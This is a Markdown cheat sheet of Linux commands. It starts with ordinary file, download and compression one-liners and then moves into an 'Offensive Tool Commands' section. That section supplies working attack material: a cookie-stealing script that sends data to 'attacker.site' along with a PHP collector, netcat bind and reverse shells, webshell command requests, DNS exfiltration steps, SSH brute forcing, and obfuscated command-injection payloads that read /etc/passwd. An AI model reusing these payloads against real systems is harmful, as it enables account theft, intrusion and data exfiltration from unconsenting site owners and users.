# Linux Commands Guide

## Using Extra Scripts/Tools

### Count Total Lines For All Files In Current Directory

```bash
wc -l * | awk '{sum+=$1} END {print sum}'
```

### Remove Comments & Empty lines from all files in current directory

```bash
find . -type f -exec sed -i '/^$/d; /^#/d' {} \;
```

### Download Long URL File (curl)

```bash
curl -L -C - -o "umt5-xxl-encoder-Q8_0.gguf" --progress-bar "https://cdn-lfs-us-1.hf.co/repos/e8/98/e8984ed8e83768f7484dd9488494adfcbbac2f1a442fbc9774c87625d1cf7464/2521d4de0bf9e1cc6549866463ceae85e4ec3239bc6063f7488810be39033bbc?response-content-disposition=attachment%3B+filename*%3DUTF-8%27%27umt5-xxl-encoder-Q8_0.gguf%3B+filename%3D%22umt5-xxl-encoder-Q8_0.gguf%22%3B&Expires=1751793769&Policy=eyJTdGF0ZW1lbnQiOlt7IkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTc1MTc5Mzc2OX19LCJSZXNvdXJjZSI6Imh0dHBzOi8vY2RuLWxmcy11cy0xLmhmLmNvL3JlcG9zL2U4Lzk4L2U4OTg0ZWQ4ZTgzNzY4ZjczNDg0ZGQ5NDg4NDk0YWRmY2JiYWMyZjFhNDQyZmJjOTc3NGM4NzYyNWQxY2Y3NDY0LzI1MjFkNGRlMGJmOWUxY2M2NTQ5ODY2NDNjZWFlODVlNGVjMzIzOWJjNjA2M2Y3NDg4ODEwYmUzOTAzM2JiYz9yZXNwb25zZS1jb250ZW50LWRpc3Bvc2l0aW9uPSoifV19&Signature=mXH%7Ek9XatY3WMhIczDgqxV3rG9b-szCkf6qRvOxrgjxk6R7y0zi7wma5HuWsoYF2a5YJqfDHe6YJA9eXrZaHYDIoVoxmhKdma-uK3f2nYqdQqqFNJlVQT4XjLdrPB0GciAG01VIT5KJ%7Exbgs7t%7ELRVcJ8Mpm0AZpxa7BEJpKV69tZefUtbaxOzorjWMrllas%7EX5%7E0g4cE9ClbR57mU0S4eFV2vkEdCZdS4ZMeHtFpbvbKjuTo%7EalvGT8qm75nPpTQ2JVM-GX7Y0UJrtU97aCalH4ZeA0%7EfPlHFf-n9pxdf9LP4L7sU1yJP7iQGjbFpD5T3joAGcrNhVsdUpZo3eDnQ__&Key-Pair-Id=K24J24Z295AEI9"
```

### Download File From URL Sequence

```bash
parallel -j 24 axel -n 24 -o ./VirusShare_{}.md5 https://virusshare.com/hashfiles/VirusShare_{}.md5 ::: {00000..00486}
```

### Grep Sensitive Files

```bash
cat allurls | grep -iE "(.*\.dat$|.*\.rtf$|.*\.xls$|.*\.ppt$|.*\.sdf$|.*\.odf$|.*\.pptx$|.*\.xlsx$|.*\.exe$|.*\.lnk$|.*\.7z$|.*\.bin$|.*\.part$|.*\.pdb$|.*\.cgi$|.*\.crdownload$|.*\.ini$|.*\.zipx$|.*\.bak$|.*\.torrent$|.*\.jar$|.*\.sys$|.*\.deb$|.*\.sh$|.*\.docm$|.*\.mdb$|.*\.xla$|.*\.zip$|.*\.tar\.gz$|.*\.txt$|.*\.json$|.*\.csv$|.*\.pdf$|.*\.doc$|.*\.docx$|.*\.js$|.*\.xml$|.*\.GIT$|.*\.git$|.*\.pem$|.*\.bash_history$|.*\.db$|.*\.key$|.*\.tar$|.*\.log$|.*\.sql$|.*\.accdb$|.*\.dbf$|.*\.apk$|.*\.cer$|.*\.cfg$|.*\.rar$|.*\.sln$|.*\.tmp$|.*\.dll$|.*\.iso$|.*\.swf$|.*\.conf$|.*\.ovpn$|.*\.bak$|.*\.ps1$|.*\.kdbx$|.*\.lst$|.*\.htaccess$|.*\.htpasswd$)"
```

### Bulk rename all files in current directory & truncate certain characters

```bash
for file in *; do mv "$file" "$(echo $file | tr -d '{}')"; done
```

### Save multiple URL to wayback machine

```bash
cat file.txt | xargs -I {} sh -c 'waybackpy --url {} --save; echo {}'
```

### Download files in parallel

- Install GNU Parallel:

```bash
sudo apt install parallel
```

- Download shell command:

```bash
cat allfiles | parallel -j50 --timeout 2 --retries 2 wget -q -t 2
```

### 7z ultra

```bash
sudo apt install -y p7zip-full
```

#### Folder Compression

```bash
7z a -t7z -m0=lzma2 -mx=9 -md=4G -mfb=273 -ms=on -mqs=on -mlc=3 -mlp=1 -mmt=32 new_file_name.7z existing_directory_name
```

#### Parallel Folder Compression

```bash
find . -mindepth 1 -maxdepth 1 -type d -print0 | parallel -0 -j 3 --bar --halt soon,fail=1 --joblog compress_joblog.tsv --results compress_logs 'bash -c '"'"'dir="$1"; base="$(basename -- "$dir")"; arc="./${base}.7z"; tmp="${arc}.part"; rm -f -- "$tmp"; nice -n 10 ionice -c2 -n7 7z a -t7z -m0=lzma2 -mx=9 -md=4G -mfb=273 -ms=on -mqs=on -mlc=3 -mlp=1 -mmt=32 -bb1 -bse1 -bsp1 "$tmp" "$dir" && 7z t "$tmp" && mv -f -- "$tmp" "$arc" '"'"' _ {}'
```

#### Parallel Folder Extraction

```bash
find . -mindepth 1 -maxdepth 1 -type f -name '*.7z' -print0 | parallel -0 -j 3 --bar --halt soon,fail=1 --joblog decompress_joblog.tsv --results decompress_logs 'bash -c '"'"'arc="$1"; base="$(basename -- "${arc%.7z}")"; out="./${base}"; work="./.${base}.extract.part"; rm -rf -- "$work"; mkdir -p -- "$work"; nice -n 10 ionice -c2 -n7 7z t "$arc" -bb1 -bse1 -bsp1 && nice -n 10 ionice -c2 -n7 7z x "$arc" -o"$work" -bb1 -bse1 -bsp1 && src="$work/$base"; if [ -d "$src" ]; then :; else src="$work"; fi; rm -rf -- "$out"; mv -T -- "$src" "$out"; rmdir --ignore-fail-on-non-empty "$work" || true'"'"' _ {}'
```

#### File Compression

```bash
7z a -t7z -m0=lzma2 -mx=9 -md=4G -mfb=273 -ms=on -mqs=on -mlc=3 -mlp=1 -mmt=32 filename.7z yourfile.exe
```

#### Max 7z Compression Settings

Please manually check how many max threads your CPU can handle!

```bash
7z a -t7z -m0=lzma2 -mx=9 -md=4G -mfb=273 -ms=on -mqs=on -mlc=3 -mlp=1 -mmt=32 filename.7z your_folder
```

### Tar Store-Only Mode

```bash
tar -cf - foldername/ | pv > archive.tar
```

#### Extraction

Please manually check how many max threads your CPU can handle!

```bash
7z x -mmt=32 archive_filename.7z
```

### Measure progress of commands

```bash
sudo apt install pv
```

#### Example use with zip command:

```bash
pv filename.ext | zip > gparted.zip
```

### Split & Remerge large file

#### Splt into 50MB files

```bash
# split large file into multiple files of a size
split --bytes=20m file.ext
```

#### Remerge

```bash
cat x* > file.ext
```

### Copy files & directories using rsync

```bash
# single file
rsync --progress /path/to/source-file.ext /path/to/destinationdir
# directory
rsync -r --progress /path/sourcedir /path/destinationdir
```

### List contents of a file, filter by lines with specific word and add inside new file

```shell
cat old_file | grep -i "word_to_filter" | anew new_file
```

### Open proxified firefox custom profile

```shell
proxychains firefox -p profile_name
```

### Run anything under proxy

```shell
proxychains script_name
```

### Clone GitHub repository faster

```shell
git clone --depth=1 https://github.com/username/reponame.git
```

### Open a file inside Sublime Text

```shell
subl filename
```

### OpenVPN Connection

```shell
sudo openvpn the_ovpn_file.ovpn
```

### SSH Connection

```shell
ssh username@servername
```

### Route through an IP

```shell
ip route add 192.168.220.0/24 via 10.10.24.1
```

### RDP connection

```shell
rdesktop 192.168.200.10
```

### Python simple http server

Start in new terminal!

```shell
sudo python -m SimpleHTTPServer 80
```

## Offensive Tool Commands

### Find subdomains of a website and save to file

```shell
assetfinder domain.com | anew filename
```

### Find if subdomains of website are alive or not

```shell
cat subdomain_list_file | httprobe | anew probed_urls
```

### Get all current and previous urls of a domain

```shell
gau domain.com | anew all_urls
```

### Perform request to webshell with command / C&C

```shell
curl -X POST https://website.com/assets/somefolder/cli.PNG -d "_=command"
```

### Inject JS payload inside image

```shell
python BMPinjector.py -i image.bmp "<scRiPt y='><'>/*<sCRipt* */prompt()</script"
```

### Get all parameters in a domain

```shell
python3 ~/ParamSpider/paramspider.py --domain https://www.website.com/ -o ~/WorkingDirectory/website_directory/pspider
```

### SQLMap tampers

```shell
--tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```

### Basic XSS url fuzzing

```shell
python3 ~/XSStrike/xsstrike.py -u https://website.com/param=FUZZ --fuzzer
```

### Clean memory items and cache on run

```shell
sudo pandora bomb
```

### Google dorking

```shell
godork -q "inurl:search.php=" -p 50 | tee results.txt
```

### Google dorking + proxychains

```shell
proxychains godork -q "inurl:search.php=" -p 50 | tee results.txt
```

### Directory bruteforcing

```shell
gobuster dir -url https://website.com/ | anew dirs && dirb https://website.com | anew dirs
```

### Using packetwhisper to exfil data using DNS

1. ```mkdir tmpwork && cd tmpwork && wget  [https://github.com/TryCatchHCF/PacketWhisper/archive/master.zip](https://github.com/TryCatchHCF/PacketWhisper/archive/master.zip)```
2. Start python simple http server
3. Goto victims machine & open outbound port
4. Generate powershell cmd & start wireshark on attacker machine
5. On victim machine, execute generated powershell code

### Ping sweep

```shell
fping -a -g 10.0.2.15/24 2> /dev/null

nmap -sn 10.0.2.15/24
```

### Find service versions of services on server

```shell
sudo nmap -sV -F -sS ip_addr
```

### Netcat bind shell

Attacker machine:

```shell
nc -lvp 1337 -e /bin/bash
```

Victim machine:

```shell
nc -v attackerip 1337
```

### JS payload - post to attacker

On victim asset:

```shell
<script> var i = new Image(); i.src="https://attacker.site/get.php?cookie="+escape(document.cookie) </script>
```

On attacker website:

```php
<?php  
  
$ip = $_SERVER['REMOTE_ADDR'];  
$browser = $_SERVER['HTTP_USER_AGENT'];  
  
$fp = fopen('jar.txt', 'a');  
fwrite($fp, $ip.' '.$browser."\n");  
fwrite($fp, urldecode($_SERVER['QUERY_STRING'])."\n\n");  
fclose($fp);
```

### Bruteforcing SSH using hydra

```shell
hydra server_ip_addr ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Password/rockyou-10.txt -f -V
```

### Airodump - Get chaninel specific traffic - filter by enc type

```shell
airodump-ng --channel 1 wlan0 / airodump-ng --channel 1 --encrypt WPA1 wlan0
```

### Airodump - Sniff all bands and channels

```shell
airodump-ng --band abg wlan0
```

### Airodump - filter by channel / essid

```shell
airodump-ng --channel 1,2,3,4 / --essid AP_NAME
```

### Get Original AP / MITM detection (part) by BSSID + ESSID filter

```shell
airodump-ng --band abg wlan0 / --essid AP_NAME / --bssid MAC_ADDRESS_OF_ORIGINAL_DEVICE
```

### Command Injection filter bypass - reflected

1. Using command seperate: ```; pwd```
2. Using command append: ```&& cat /etc/passwd```
3. Using pipe: ```| cat /etc/passwd```
4. Using quoted command - add quotes for any character in word (EX:```cat/et"c"/p"a"ssw"d"```)
5. Using wildcards - replace any word with "```*```" & "```?```" (EX:```cat /etc/pa*wd``` or ```cat /etc/p?sswd```)
6. Using null vars - add ``` `` ``` in between words (EX:```cat /e``tc/p``asswd```)
7. Multi bypass - (EX:``` |cat /"e"t``c/p?sswd ```)
8. Lethal injection 1 - reversed + multi filters (EX:```echo "dws?ap/c``t"e"/ tac" | rev | /bin/bash```)
9. Lethal injection 2 - reversed + endeded + multi filters (EX:```echo "ZHdzP2FwL2NgYHQiZSIvIHRhYw==" | base64 -d | rev | /bin/bash```)

Fuzzing for bypass: https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/command-injection.md

```"dws?ap/c``t"e"/ tac" | rev```

### Command Injection filter bypass - blind

1. Test reflection

On victim asset:

```shell
127.0.0.1 | nc ip_addr_attacker port_number
```

On attacker machine:

```shell
nc -lvp port_number
```

2. If reflection success, get reverse shell

On victim asset:

```shell
127.0.0.1 | nc ip_addr_attacker port_number -e /bin/bash
```

On attacker machine:

```shell
python -c "import pty:pty.spawn('/bin/bash')"
```
